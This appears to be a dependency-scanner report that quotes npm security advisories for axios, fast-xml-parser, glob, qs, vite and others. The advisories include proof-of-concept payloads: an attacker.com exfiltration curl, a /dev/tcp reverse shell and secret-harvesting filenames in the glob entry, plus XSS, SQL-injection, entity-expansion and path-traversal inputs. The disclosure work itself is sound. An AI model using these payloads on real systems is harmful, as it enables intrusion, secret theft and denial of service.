An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1.

With a very small XML input, it’s possible to make the parser spend seconds or even minutes processing a single request, effectively freezing the application.\n\n### Details\nThere is a check in `DocTypeReader.js` that tries to prevent entity expansion attacks by rejecting entities that reference other entities (it looks for & inside entity values). This does stop classic “Billion Laughs” payloads.\n\nHowever, it doesn’t stop a much simpler variant.\n\nIf you define one large entity that contains only raw text (no & characters) and then reference it many times, the parser will happily expand it every time. There is no limit on how large the expanded result can become, or how many replacements are allowed.\n\nThe problem is in `replaceEntitiesValue()` inside `OrderedObjParser.js`. It repeatedly runs `val.replace()` in a loop, without any checks on total output size or execution cost. As the entity grows or the number of references increases, parsing time explodes.\n\nRelevant code:\n\n`DocTypeReader.js` (lines 28–33): entity registration only checks for &\n\n`OrderedObjParser.js` (lines 439–458): entity replacement loop with no limits\n\n### PoC\n\n```js\nconst { XMLParser } = require('fast-xml-parser');\n\nconst entity = 'A'.repeat(1000);\nconst refs = '&big;'.repeat(100);\nconst xml = `<!DOCTYPE foo [<!ENTITY big \"${entity}\">]><root>${refs}</root>`;\n\nconsole.time('parse');\nnew XMLParser().parse(xml); // ~4–8 seconds for ~1.3 KB of XML\nconsole.timeEnd('parse');\n\n// 5,000 chars × 100 refs takes 200+ seconds\n// 50,000 chars × 1,000 refs will hang indefinitely\n```\n\n### Impact\nThis is a straightforward denial-of-service issue.\n\nAny service that parses user-supplied XML using the default configuration is vulnerable.

This bypasses entity encoding and leads to XSS when parsed output is rendered.\n\n## Details\n\nThe fix for CVE-2023-34104 addressed some regex metacharacters in entity names but missed `.` (period), which is valid in XML names per the W3C spec.\n\nIn `DocTypeReader.js`, entity names are passed directly to `RegExp()`:\n\n```js\nentities[entityName] = {\n    regx: RegExp(`&${entityName};`, \"g\"),\n    val: val\n};\n```\n\nAn entity named `l.` produces the regex `/&l.;/g` where `.` matches **any character**, including the `t` in `&lt;`. Since DOCTYPE entities are replaced before built-in entities, this shadows `&lt;` entirely.\n\nThe same issue exists in `OrderedObjParser.js:81` (`addExternalEntities`), and in the v6 codebase - `EntitiesParser.js` has a `validateEntityName` function with a character blacklist, but `.` is not included:\n\n```js\n// v6 EntitiesParser.js line 96\nconst specialChar = \"!?\\\\/[]$%{}^&*()<>|+\";  // no dot\n```\n\n## Shadowing all 5 built-in entities\n\n| Entity name | Regex created | Shadows |\n|---|---|---|\n| `l.` | `/&l.;/g` | `&lt;` |\n| `g.` | `/&g.;/g` | `&gt;` |\n| `am.` | `/&am.;/g` | `&amp;` |\n| `quo.` | `/&quo.;/g` | `&quot;` |\n| `apo.` | `/&apo.;/g` | `&apos;` |\n\n## PoC\n\n```js\nconst { XMLParser } = require(\"fast-xml-parser\");\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY l. \"<img src=x onerror=alert(1)>\">\n]>\n<root>\n  <text>Hello &lt;b&gt;World&lt;/b&gt;</text>\n</root>`;\n\nconst result = new XMLParser().parse(xml);\nconsole.log(result.root.text);\n// Hello <img src=x onerror=alert(1)>b>World<img src=x onerror=alert(1)>/b>\n```\n\nNo special parser options needed - `processEntities: true` is the default.\n\nWhen an app renders `result.root.text` in a page (e.g. `innerHTML`, template interpolation, SSR), the injected `<img onerror>` fires.\n\n`&amp;` can be shadowed too:\n\n```js\nconst xml2 = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY am. \"'; DROP TABLE users;--\">\n]>\n<root>SELECT * FROM t WHERE name='O&amp;Brien'</root>`;\n\nconst r = new XMLParser().parse(xml2);\nconsole.log(r.root);\n// SELECT * FROM t WHERE name='O'; DROP TABLE users;--Brien'\n```\n\n## Impact\n\nThis is a complete bypass of XML entity encoding.

This completely undermines it with no preconditions.","references":[{"type":"WEB","url":"https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-m7jm-9gc2-mpf2"},{"type":"WEB","url":"https://github.com/NaturalIntelligence/fast-xml-parser/commit/943ef0eb1b2d3284e72dd74f44a042ee9f07026e"},{"type":"WEB","url":"https://github.com/NaturalIntelligence/fast-xml-parser/commit/ddcd0acf26ddd682cb0dc15a2bd6aa3b96bb1e69"},{"type":"PACKAGE","url":"https://github.com/NaturalIntelligence/fast-xml-parser"},{"type":"WEB","url":"https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.5"}],"aliases":["CVE-2026-25896"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-20T21:37:07.623Z"}},{"id":"GHSA-5j98-mcp5-4vw2@glob-10.4.5","package":{"name":"glob","version":"10.4.5","ecosystem":"npm","purl":"pkg:npm/glob"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"},"affectedVersions":{"ranges":[{"introduced":"11.0.0","fixed":"11.1.0"}]},"fix":{"available":true,"version":"11.1.0","requiresMajorUpdate":true},"details":{"title":"glob CLI: Command injection via -c/--cmd executes matches with shell:true","description":"### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names.

Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","references":[{"type":"WEB","url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-glob"}],"aliases":["CVE-2025-64756"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-20T21:37:07.623Z"}},{"id":"GHSA-mh29-5h37-fv8m@js-yaml-4.1.0","package":{"name":"js-yaml","version":"4.1.0","ecosystem":"npm","purl":"pkg:npm/js-yaml"},"severity":{"level":"moderate","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"},"affectedVersions":{"ranges":[{"introduced":"4.0.0","fixed":"4.1.1"}]},"fix":{"available":true,"version":"4.1.1","requiresMajorUpdate":false},"details":{"title":"js-yaml has prototype pollution in merge (<<)","description":"### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`).

ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.","references":[{"type":"WEB","url":"https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/pull/1124"},{"type":"PACKAGE","url":"https://github.com/digitalbazaar/forge"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167"},{"type":"WEB","url":"https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667"},{"type":"WEB","url":"https://kb.cert.org/vuls/id/521113"},{"type":"WEB","url":"https://www.kb.cert.org/vuls/id/521113"},{"type":"WEB","url":"https://www.npmjs.com/package/node-forge"}],"aliases":["CVE-2025-12816"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-20T21:37:07.624Z"}},{"id":"GHSA-65ch-62r8-g69g@node-forge-1.3.1","package":{"name":"node-forge","version":"1.3.1","ecosystem":"npm","purl":"pkg:npm/node-forge"},"severity":{"level":"moderate","type":"CVSS_V4","vector":"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"},"affectedVersions":{"ranges":[{"introduced":"0","fixed":"1.3.2"}]},"fix":{"available":true,"version":"1.3.2","requiresMajorUpdate":false},"details":{"title":"node-forge is vulnerable to ASN.1 OID Integer Truncation","description":"### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs.

Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ?

This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThe `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion.\n\n### Suggested Fix\nMove the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes.\n\n**Current code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\n\n**Fixed code:**\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    const splitArray = val.split(',');\n    if (splitArray.length > options.arrayLimit - currentArrayLength) {  // Check against remaining limit\n        if (options.throwOnLimitExceeded) {\n            throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n        } else {\n            // Optionally convert to object or truncate, per README\n            return splitArray.slice(0, options.arrayLimit - currentArrayLength);\n        }\n    }\n    return splitArray;\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThis aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`.

The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb","references":[{"type":"WEB","url":"https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-58751"},{"type":"WEB","url":"https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0"},{"type":"PACKAGE","url":"https://github.com/vitejs/vite"}],"aliases":["CVE-2025-58751"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-20T21:37:07.632Z"}},{"id":"GHSA-jqfw-vq24-v9c3@vite-5.4.19","package":{"name":"vite","version":"5.4.19","ecosystem":"npm","purl":"pkg:npm/vite"},"severity":{"level":"low","type":"CVSS_V4","vector":"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"},"affectedVersions":{"ranges":[{"introduced":"7.1.0","fixed":"7.1.5"}]},"fix":{"available":true,"version":"7.1.5","requiresMajorUpdate":true},"details":{"title":"Vite's `server.fs` settings were not applied to HTML files","description":"### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server.

Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.","references":[{"type":"WEB","url":"https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-58752"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6"},{"type":"PACKAGE","url":"https://github.com/vitejs/vite"},{"type":"WEB","url":"https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md"}],"aliases":["CVE-2025-58752"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-02-20T21:37:07.634Z"}},{"id":"GHSA-4r6h-8v6p-xvw6@xlsx-0.18.5","package":{"name":"xlsx","version":"0.18.5","ecosystem":"npm","purl":"pkg:npm/xlsx"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"},"affectedVersions":{"ranges":[{"introduced":"0"}]},"details":{"title":"Prototype Pollution in sheetJS","description":"All versions of SheetJS CE through 0.19.2 are vulnerable to \"Prototype Pollution\" when reading specially crafted files.
